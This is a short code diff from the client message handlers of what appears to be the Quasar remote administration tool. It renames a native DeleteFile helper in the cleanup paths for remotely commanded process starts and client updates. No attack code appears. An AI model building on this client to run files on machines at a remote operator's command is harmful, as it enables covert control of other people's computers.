@@ -109,7 +109,7 @@ namespace Quasar.Client.MessageHandlers
                 catch
                 {
                     client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
-                    NativeMethods.DeleteFile(message.FilePath);
+                    SharedNatives.DeleteFile(message.FilePath);
                 }
             }
             else
@@ -124,7 +124,7 @@ namespace Quasar.Client.MessageHandlers
             var message = (DoProcessStart)e.UserState;
             if (e.Cancelled)
             {
-                NativeMethods.DeleteFile(message.FilePath);
+                SharedNatives.DeleteFile(message.FilePath);
                 return;
             }
 
@@ -144,7 +144,7 @@ namespace Quasar.Client.MessageHandlers
                 }
                 catch (Exception ex)
                 {
-                    NativeMethods.DeleteFile(filePath);
+                    SharedNatives.DeleteFile(filePath);
                     _client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
                 }
             }
